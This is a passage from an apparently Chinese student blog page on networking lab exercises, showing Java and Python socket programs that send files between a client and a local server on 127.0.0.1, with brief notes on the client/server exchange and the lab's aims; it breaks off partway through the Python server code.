operator">=</span> fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    dos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>                    dos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    progress <span class="token operator">+=</span> length<span class="token punctuation">;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"| "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span>progress<span class="token operator">/</span>file<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"% |"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"======== 文件传输成功 ========"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>fis <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>dos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>                dos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            client<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**入口 @param args */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">FileTransferClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileTransferClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启动客户端连接</span>            client<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 传输文件</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="服务器程序："><a href="#服务器程序：" class="headerlink" title="服务器程序："></a>服务器程序：</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">DataInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">RoundingMode</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">DecimalFormat</span><span class="token punctuation">;</span><span class="token comment">//文件传输Server端</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileTransferServer</span> <span class="token keyword">extends</span> <span class="token class-name">ServerSocket</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> SERVER_PORT <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span> <span class="token comment">// 服务端端口</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">DecimalFormat</span> df <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        df <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DecimalFormat</span><span class="token punctuation">(</span><span class="token string">"#0.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置数字格式，保留一位有效小数</span>        df<span class="token punctuation">.</span><span class="token function">setRoundingMode</span><span class="token punctuation">(</span><span class="token class-name">RoundingMode</span><span class="token punctuation">.</span>HALF_UP<span class="token punctuation">)</span><span class="token punctuation">;</span>        df<span class="token punctuation">.</span><span class="token function">setMinimumFractionDigits</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        df<span class="token punctuation">.</span><span class="token function">setMaximumFractionDigits</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">FileTransferServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//使用线程处理每个客户端传输的文件</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// server尝试接收其他Socket的连接请求，server的accept方法是阻塞式的</span>            <span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 每接收到一个Socket就建立一个新的线程来处理它</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Task</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 处理客户端传输过来的文件线程类</span>    <span class="token keyword">class</span> <span class="token class-name">Task</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token class-name">Socket</span> socket<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">DataInputStream</span> dis<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token class-name">FileOutputStream</span> fos<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">Task</span><span class="token punctuation">(</span><span class="token class-name">Socket</span> socket<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                dis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> fileName <span class="token operator">=</span> dis<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 文件名和长度</span>                <span class="token keyword">long</span> fileLength <span class="token operator">=</span> dis<span class="token punctuation">.</span><span class="token function">readLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 文件名和长度</span>                <span class="token class-name">File</span> directory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"E:\\testserver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>directory<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    directory<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>directory<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separatorChar <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 开始接收文件</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">=</span> dis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>                    fos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"======== 文件接收成功 [File Name："</span> <span class="token operator">+</span> fileName <span class="token operator">+</span> <span class="token string">"] [Size："</span> <span class="token operator">+</span> <span class="token function">getFormatFileSize</span><span class="token punctuation">(</span>fileLength<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"] ========"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>fos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>dis <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>dis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 格式化文件大小     * @param length     * @return     */</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">getFormatFileSize</span><span class="token punctuation">(</span><span class="token keyword">long</span> length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">double</span> size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span> length<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> df<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"GB"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span> length<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> df<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"MB"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span> length<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> df<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"KB"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> length <span class="token operator">+</span> <span class="token string">"B"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 入口     * @param args     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">FileTransferServer</span> server <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileTransferServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启动服务端</span>            server<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个完整的交互过程分为四步</p><p>客户机发消息；把信息装配成请求消息，发往服务器，然后进入等待状态；服务器收消息，服务器接收进程平时就一直处于等待状态，将收到消息用相应软件进行处理；服务器回消息，再把处理结果装配成响应消息发送出去</p><p>客户机收消息，接收响应</p><p>在实验中，客户端或服务器在一次一次基础上，如果服务端连续发送多个数据之后，并不会直接在客户端上线上而需要，等待客户端发送信息后再显示</p><h2 id="实验四-文件传送器"><a href="#实验四-文件传送器" class="headerlink" title="实验四  文件传送器"></a>实验四  文件传送器</h2><p>实验目的</p><blockquote><p>理解客户/服务器模式的工作原理；掌握网络连接的建立方式；掌握文件传输的基本方法。</p></blockquote><p>实验内容:</p><ul><li>在Windows环境下建立一个文件服务器；</li><li>采用可靠传输的形式传输任意格式文件</li><li>编写可用于实际网络环境的文件传送器；</li><li> 可指定传输的本地文件；</li><li>文件传送器的两个传送端可工作于不同的主机上或同一主机的不同程序；</li><li>编程语言不限。</li></ul><p>实验环境：Windows操作系统、JAVA或C++编程环境</p><h3 id="客户端代码："><a href="#客户端代码：" class="headerlink" title="客户端代码："></a>客户端代码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> struct<span class="token keyword">import</span> jsondownload_dir <span class="token operator">=</span> <span class="token string">'C:\\Users\888888\Desktop'</span>  <span class="token comment"># 这里是客户端存放资源的地址</span>phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>phone<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">8848</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------开始咨询客服---------"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token comment"># 发命令</span>  cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'>>:'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># get a.txt</span>  <span class="token keyword">if</span> <span class="token keyword">not</span> cmd<span class="token punctuation">:</span>     <span class="token keyword">continue</span>  phone<span class="token punctuation">.</span>send<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 已写的方式打开一个新文件，接收服务器发来的文件的内容写入客户端的新文件</span>  <span class="token comment"># 第一步：先收取报头的长度</span>  obj <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  header_size <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># 第二步：再收报头</span>  header_bytes <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>header_size<span class="token punctuation">)</span>  <span class="token comment"># 第三步：从报头中间解析出对真是数据的描述信息</span>  header_json <span class="token operator">=</span> header_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>  header_dic <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>header_json<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>  total_size <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'file_size'</span><span class="token punctuation">]</span>  filename <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span>  <span class="token comment"># 第三步：接受真实的数据</span>  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>download_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment"># 在自己的电脑中找一个地址打开一个同类型的文件准备接收数据</span>     recv_size <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">while</span> recv_size <span class="token operator">&lt;</span> total_size<span class="token punctuation">:</span>       line <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>       f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>       recv_size <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'总大小：%s  已下载大小：%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>total_size<span class="token punctuation">,</span> recv_size<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 显示下载进度</span>phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="服务器代码："><a href="#服务器代码：" class="headerlink" title="服务器代码："></a>服务器代码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json  <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">import</span> osshare_dir <span class="token operator">=</span><span class="token string">'C:\\Users\\888888\\Desktop\\new'</span><span class="token comment"># 这里是服务器储存资源的地址</span>phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>phone<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8848</span><span class="token punctuation">)</span><span class="token punctuation">)</span>phone<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  conn<span class="token punctuation">,</span> client <span class="token operator">=</span> phone<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>       <span class="token comment"># 收命令</span>       res <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8096</span><span class="token punctuation">)</span>  <span class="token comment"># b'get a.txt'</span>       <span class="token comment"># 解析命令、提取相应的命令参数</span>       cmds <span class="token operator">=</span> res<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ['get','a.txt']  split变列表格式</span>       filename <span class="token operator">=</span> cmds<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>       <span class="token comment"># 已读的方式打开文件，读取文件内容发送给客户端</span>       <span class="token comment"># 第一步：制作固定长度的报头</span>       header_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>         <span class="token string">'filename'</span><span class="token punctuation">:</span> filename<span class="token punctuation">,</span>         <span class="token string">'file_size'</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span><span class="token string">r'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 这里把文件的名字和地址结合在一起得到文件长度</span>       <span class="token punctuation">&#125;</span>    <span class="token comment"># 字典方便储存数据</span>       header_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>  <span class="token comment"># 把字典转换成js格式(字符串类型)</span>       header_bytes <span class="token operator">=</span> header_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>       <span class="token comment"># 第二步：先发送报头的长度</span>       conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment"># 第三步：再发报头</span>       conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span>       <span class="token comment"># 第四步：发送真实数据</span>       <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token 